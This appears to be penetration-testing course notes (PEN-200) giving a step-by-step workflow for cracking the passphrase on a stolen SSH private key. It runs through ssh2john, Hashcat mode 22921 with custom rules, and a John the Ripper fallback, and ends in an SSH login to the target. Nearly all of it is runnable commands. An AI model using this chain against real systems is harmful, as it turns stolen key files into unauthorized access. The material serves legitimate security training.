# SSH Private Key Passphrase Cracking

A stolen `id_rsa` may still be protected by a passphrase. Treat the key file as credential material that can be converted and attacked offline.

## 1. Test the key

```bash
chmod 600 id_rsa
ssh -i id_rsa -p <PORT> <USER>@<TARGET_IP>
```

If SSH prompts for a key passphrase and likely candidates fail, move to offline cracking.

## 2. Convert the key with John helpers

```bash
ssh2john id_rsa > ssh.hash
cat ssh.hash
```

For Hashcat, the PEN-200 workflow removes the filename prefix before the first colon and then identifies the corresponding mode.

```bash
hashcat -h | grep -i 'ssh'
```

In the Chapter 13 example, the generated `$6$` private-key representation maps to Hashcat mode `22921`.

## 3. Build a targeted wordlist and rules

Use evidence from notes, config files, password policy, usernames, or previously recovered passwords. Example rule logic from the chapter: capitalize the base word, append a known three-digit pattern, then append a common special character.

```text
# ssh.rule
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

```bash
hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule
```

## 4. If Hashcat rejects the key, try John the Ripper

The PEN-200 example hits a **Token length exception** because the modern OpenSSH key/cipher is not supported by that Hashcat mode, while JtR can process it.

Give the John rule set a name and append it to `/etc/john/john.conf`:

```text
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

```bash
sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'
john --wordlist=ssh.passwords --rules=sshRules ssh.hash
john --show ssh.hash
```

## 5. Authenticate with the recovered passphrase

```bash
ssh -i id_rsa -p <PORT> <USER>@<TARGET_IP>
```

## Quick chain

```text
private key found
  → chmod 600 + test
  → passphrase required
  → ssh2john
  → targeted wordlist + human-pattern rules
  → Hashcat if supported / JtR fallback
  → SSH access
```
